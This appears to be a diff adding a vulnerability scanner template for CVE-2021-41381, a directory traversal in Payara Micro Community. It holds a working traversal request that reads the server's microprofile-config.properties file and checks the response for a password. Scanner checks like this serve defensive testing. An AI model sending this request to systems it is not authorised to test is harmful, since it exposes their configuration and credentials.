@@ -1,0 +1,28 @@
+id: cve-2021-41381
+info:
+  name: Payara Micro Community Information Leakage
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Payara Micro Community 5.2021.6 and below allows Directory Traversal. Attackers can obtain sensitive information such as service configuration, leading to system takeover.
+  reference:
+    - https://www.exploit-db.com/exploits/50371
+    - https://www.payara.fish
+  classification:
+    cve-id: CVE-2021-41381
+    cvss-score: 6.0
+http:
+  - raw:
+      - |
+        GET /.//WEB-INF/classes/META-INF/microprofile-config.properties HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "security.openid.default.providerURI="
+          - "Submission"
+          - "password"
+      - type: status
+        status:
+          - 200
